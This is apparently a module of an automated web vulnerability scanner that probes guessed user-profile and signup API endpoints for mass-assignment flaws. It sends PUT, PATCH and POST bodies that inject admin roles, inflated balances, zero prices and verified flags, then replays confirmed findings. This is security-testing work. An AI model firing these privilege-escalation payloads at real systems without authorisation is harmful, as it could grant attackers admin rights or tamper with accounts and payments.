import axios from "axios";
import logger from "../../utils/logger";
import { csrfAwareRequest } from "./csrf-aware-request";

interface MassAssignmentVuln {
  endpoint: string;
  method: string;
  fields: string[];
  accepted: boolean;
  reflected: boolean;
  severity: "critical" | "high" | "medium";
  detail: string;
}

interface MassAssignmentResult {
  endpointsTested: number;
  vulns: MassAssignmentVuln[];
  hypotheses: Array<{ vulnClass: string; reasoning: string; confidence: number; priority: number; endpoint: string; raw: MassAssignmentVuln }>;
}

const MARKER = "netty_ma_test";

const PRIV_FIELDS: Array<Record<string, unknown>> = [
  { role: "admin", isAdmin: true, admin: true, is_admin: true },
  { role: "superuser", privilege: "admin", permissions: ["admin"], access_level: 999 },
  { verified: true, email_verified: true, confirmed: true, active: true },
  { balance: 99999, credits: 99999, points: 99999, wallet: 99999 },
  { price: 0, cost: 0, amount: 0, discount: 100 },
  { group_id: 1, team_id: 1, org_id: 1, account_type: "enterprise" },
];

const UPDATE_ENDPOINTS = [
  "/api/user",
  "/api/me",
  "/api/profile",
  "/api/account",
  "/api/users/me",
  "/api/v1/user",
  "/api/v1/me",
];

const REGISTER_ENDPOINTS = [
  "/api/register",
  "/api/signup",
  "/api/users",
];

const CRITICAL_FIELDS = new Set(["role", "isAdmin", "admin", "is_admin", "privilege", "permissions", "access_level"]);
const HIGH_FIELDS = new Set(["balance", "credits", "points", "wallet", "price", "cost", "amount", "discount"]);

function classifyFields(fields: string[]): "critical" | "high" | "medium" {
  for (const f of fields) {
    if (CRITICAL_FIELDS.has(f)) return "critical";
  }
  for (const f of fields) {
    if (HIGH_FIELDS.has(f)) return "high";
  }
  return "medium";
}

function containsMarker(data: unknown): boolean {
  return JSON.stringify(data).includes(MARKER);
}

function getNewFields(baseline: unknown, response: unknown): string[] {
  try {
    if (typeof baseline !== "object" || baseline === null) return [];
    if (typeof response !== "object" || response === null) return [];
    const baseKeys = new Set(Object.keys(baseline as Record<string, unknown>));
    return Object.keys(response as Record<string, unknown>).filter((k) => !baseKeys.has(k));
  } catch {
    return [];
  }
}

function bodyLength(data: unknown): number {
  return (typeof data === "string" ? data : JSON.stringify(data ?? "")).length;
}

class MassAssignmentProber {
  private async getBaseline(
    url: string,
    authHeaders: Record<string, string>
  ): Promise<unknown> {
    try {
      const response = await axios.get(url, {
        headers: { ...authHeaders },
        timeout: 7000,
        validateStatus: () => true,
      });
      return response.data;
    } catch {
      return null;
    }
  }

  // A SPA served with a server-side catch-all (any unmatched path,
  // including a guessed-but-nonexistent /api/user, falls through to the
  // same index.html shell) makes "the request returned 200/201/204"
  // meaningless on its own — that status is guaranteed for any path,
  // real or not. This mirrors the exact fix already applied to
  // race-condition-detector.ts: fetch one guaranteed-bogus path with the
  // SAME HTTP method, and treat a guessed endpoint's response as "not a
  // real, distinct route" if it's indistinguishable (status + body length)
  // from that baseline, before trusting `accepted` at all.
  private nonexistentBaselines = new Map<string, { status: number; bodyLength: number } | null>();

  private async getNonexistentPathBaseline(
    baseUrl: string,
    method: "PUT" | "PATCH" | "POST",
    authHeaders: Record<string, string>
  ): Promise<{ status: number; bodyLength: number } | null> {
    const key = `${method}:${baseUrl}`;
    if (this.nonexistentBaselines.has(key)) return this.nonexistentBaselines.get(key)!;
    try {
      const bogusPath = `/__nettyhunter_baseline_${Math.random().toString(36).slice(2)}__`;
      const response = await axios.request({
        method,
        url: `${baseUrl}${bogusPath}`,
        data: { name: "test" },
        headers: { ...authHeaders, "Content-Type": "application/json" },
        timeout: 7000,
        validateStatus: () => true,
      });
      const baseline = { status: response.status, bodyLength: bodyLength(response.data) };
      this.nonexistentBaselines.set(key, baseline);
      return baseline;
    } catch {
      this.nonexistentBaselines.set(key, null);
      return null;
    }
  }

  private async testUpdateEndpoint(
    baseUrl: string,
    path: string,
    fieldSet: Record<string, unknown>,
    baseline: unknown,
    authHeaders: Record<string, string>,
    nonexistentBaselines: Partial<Record<"PUT" | "PATCH", { status: number; bodyLength: number } | null>>
  ): Promise<MassAssignmentVuln[]> {
    const url = `${baseUrl}${path}`;
    const methods = ["PUT", "PATCH"] as const;
    const vulns: MassAssignmentVuln[] = [];
    const body = { name: "test", ...fieldSet };
    const injectedKeys = Object.keys(fieldSet);

    for (const method of methods) {
      try {
        const response = await csrfAwareRequest(url, method, body, {
          ...authHeaders,
          "Content-Type": "application/json",
        }, 7000);

        const nonexistent = nonexistentBaselines[method];
        if (nonexistent && response.status === nonexistent.status && bodyLength(response.data) === nonexistent.bodyLength) {
          continue; // indistinguishable from a route that doesn't exist
        }

        const accepted = [200, 201, 204].includes(response.status);
        const reflected = containsMarker(response.data) ||
          injectedKeys.some((k) => {
            const val = (response.data as Record<string, unknown>)?.[k];
            return val !== undefined && val !== null;
          });

        const newFields = getNewFields(baseline, response.data);
        const effectiveAccepted = accepted || newFields.length > 0;

        if (!effectiveAccepted) {
          continue;
        }

        const matchedFields = injectedKeys.filter((k) =>
          newFields.includes(k) ||
          (response.data as Record<string, unknown>)?.[k] !== undefined
        );
        const reportedFields = matchedFields.length > 0 ? matchedFields : injectedKeys;
        const severity = classifyFields(reportedFields);
        const csrfNote = response.csrfBypassUsed ? " (reachable via self-minted CSRF token — no real auth required)" : "";
        const detail = (reflected
          ? `Injected privileged fields [${reportedFields.join(", ")}] were reflected in ${method} ${path} response`
          : `Server accepted ${method} ${path} with privileged fields [${reportedFields.join(", ")}] (status ${response.status})`) + csrfNote;

        logger.debug(
          `[MassAssignmentProber] Vuln at ${method} ${url} fields=${reportedFields.join(",")} accepted=${effectiveAccepted} reflected=${reflected}`
        );

        vulns.push({
          // Full URL, not the bare path — HunterEngine's seed site uses this as
          // the hypothesis's targetUrl (`hyp.endpoint || this.state.targetUrl`),
          // and a truthy relative path like "/api/user" always won that fallback,
          // silently producing a hypothesis whose targetUrl was a relative path
          // rather than an absolute URL.
          endpoint: url,
          method,
          fields: reportedFields,
          accepted: effectiveAccepted,
          reflected,
          severity,
          detail,
        });
      } catch (err) {
        logger.debug(
          `[MassAssignmentProber] Error testing ${method} ${url}: ${(err as Error).message}`
        );
      }
    }

    return vulns;
  }

  private async testRegisterEndpoint(
    baseUrl: string,
    path: string,
    fieldSet: Record<string, unknown>,
    authHeaders: Record<string, string>,
    nonexistentBaseline: { status: number; bodyLength: number } | null
  ): Promise<MassAssignmentVuln[]> {
    const url = `${baseUrl}${path}`;
    const vulns: MassAssignmentVuln[] = [];
    const body = {
      name: "test",
      username: `netty_test_${Date.now()}`,
      email: `netty_test_${Date.now()}@example.com`,
      password: "NettyTest123!",
      ...fieldSet,
    };
    const injectedKeys = Object.keys(fieldSet);

    try {
      const response = await csrfAwareRequest(url, "POST", body, {
        ...authHeaders,
        "Content-Type": "application/json",
      }, 7000);

      if (nonexistentBaseline && response.status === nonexistentBaseline.status && bodyLength(response.data) === nonexistentBaseline.bodyLength) {
        return vulns; // indistinguishable from a route that doesn't exist
      }

      const accepted = [200, 201, 204].includes(response.status);
      const reflected = containsMarker(response.data) ||
        injectedKeys.some((k) => {
          const val = (response.data as Record<string, unknown>)?.[k];
          return val !== undefined && val !== null;
        });

      if (!accepted) {
        return vulns;
      }

      const matchedFields = injectedKeys.filter(
        (k) => (response.data as Record<string, unknown>)?.[k] !== undefined
      );
      const reportedFields = matchedFields.length > 0 ? matchedFields : injectedKeys;
      const severity = classifyFields(reportedFields);
      const csrfNote = response.csrfBypassUsed ? " (reachable via self-minted CSRF token — no real auth required)" : "";
      const detail = (reflected
        ? `Injected privileged fields [${reportedFields.join(", ")}] were reflected in POST ${path} registration response`
        : `Server accepted POST ${path} registration with privileged fields [${reportedFields.join(", ")}] (status ${response.status})`) + csrfNote;

      logger.debug(
        `[MassAssignmentProber] Vuln at POST ${url} fields=${reportedFields.join(",")} accepted=${accepted} reflected=${reflected}`
      );

      vulns.push({
        // Full URL, not the bare path — see the matching comment in
        // testUpdateEndpoint above.
        endpoint: url,
        method: "POST",
        fields: reportedFields,
        accepted,
        reflected,
        severity,
        detail,
      });
    } catch (err) {
      logger.debug(
        `[MassAssignmentProber] Error testing POST ${url}: ${(err as Error).message}`
      );
    }

    return vulns;
  }

  /**
   * Re-test a specific already-discovered mass-assignment finding for the
   * verifier's Layer 2 reprobe. A bare GET (the generic reprobe fallback)
   * proves nothing about a POST/PUT/PATCH-body vulnerability — this replays
   * the SAME method + field-injection this finding was originally raised
   * from, reusing the exact accept/reflect logic probe() uses, rather than
   * re-implementing it. `fields` is matched against PRIV_FIELDS to recover
   * the full injected value set (the finding only carries field NAMES, not
   * the values that were actually sent).
   */
  async reprobe(
    endpoint: string,
    method: string,
    fields: string[],
    authHeaders: Record<string, string> = {}
  ): Promise<{ confirmed: boolean; statusCode: number; responseSnippet: string }> {
    const fieldSet = PRIV_FIELDS.find(set =>
      fields.every(f => f in set)
    ) ?? Object.fromEntries(fields.map(f => [f, CRITICAL_FIELDS.has(f) ? true : 99999]));

    const isRegisterStyle = /register|signup|\/users\/?$/i.test(endpoint) || method.toUpperCase() === "POST";
    const vulns = isRegisterStyle
      ? await this.testRegisterEndpoint("", endpoint, fieldSet, authHeaders, null)
      : await this.testUpdateEndpoint("", endpoint, fieldSet, null, authHeaders, {});

    if (vulns.length === 0) {
      return { confirmed: false, statusCode: 0, responseSnippet: "Replay found no accepted/reflected privileged field" };
    }
    const hit = vulns[0];
    return {
      confirmed: hit.accepted || hit.reflected,
      statusCode: hit.accepted ? 200 : 0,
      responseSnippet: hit.detail,
    };
  }

  async probe(rawTargetUrl: string, authHeaders?: Record<string, string>): Promise<MassAssignmentResult> {
    const targetUrl = rawTargetUrl.replace(/\/$/, "");
    const headers = authHeaders ?? {};
    const allVulns: MassAssignmentVuln[] = [];

    const [putBaseline, patchBaseline, postBaseline] = await Promise.all([
      this.getNonexistentPathBaseline(targetUrl, "PUT", headers),
      this.getNonexistentPathBaseline(targetUrl, "PATCH", headers),
      this.getNonexistentPathBaseline(targetUrl, "POST", headers),
    ]);
    const nonexistentBaselines = { PUT: putBaseline, PATCH: patchBaseline };

    // Test update endpoints (PUT/PATCH)
    const updateTasks = UPDATE_ENDPOINTS.flatMap((path) =>
      PRIV_FIELDS.map(async (fieldSet) => {
        const baseline = await this.getBaseline(`${targetUrl}${path}`, headers);
        return this.testUpdateEndpoint(targetUrl, path, fieldSet, baseline, headers, nonexistentBaselines);
      })
    );

    // Test registration endpoints (POST)
    const registerTasks = REGISTER_ENDPOINTS.flatMap((path) =>
      PRIV_FIELDS.map((fieldSet) =>
        this.testRegisterEndpoint(targetUrl, path, fieldSet, headers, postBaseline)
      )
    );

    const allTasks = [...updateTasks, ...registerTasks];
    const settled = await Promise.allSettled(allTasks);

    for (const result of settled) {
      if (result.status === "fulfilled") {
        allVulns.push(...result.value);
      }
    }

    // Deduplicate by endpoint+method+fields signature
    const seen = new Set<string>();
    const dedupedVulns = allVulns.filter((v) => {
      const key = `${v.method}:${v.endpoint}:${[...v.fields].sort().join(",")}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });

    const hypotheses = dedupedVulns.map((v) => ({
      vulnClass: "mass_assignment",
      reasoning: v.detail,
      confidence: v.reflected ? 0.75 : 0.6,
      priority: v.severity === "critical" ? 9 : v.severity === "high" ? 7 : 5,
      endpoint: v.endpoint,
      // Full detection detail — HunterEngine attaches this to the hypothesis's
      // evidence so the PROBE phase can recognize this hypothesis was already
      // actively confirmed here (a real PUT/PATCH/POST that accepted or
      // reflected injected privileged fields) and skip re-dispatching it to
      // nuclei's misconfig-tag fallback, which has no templates that test for
      // field-level authorization on arbitrary app-specific update/register
      // endpoints.
      raw: v,
    }));

    const endpointsTested = UPDATE_ENDPOINTS.length + REGISTER_ENDPOINTS.length;

    return {
      endpointsTested,
      vulns: dedupedVulns,
      hypotheses,
    };
  }
}

export const massAssignmentProber = new MassAssignmentProber();
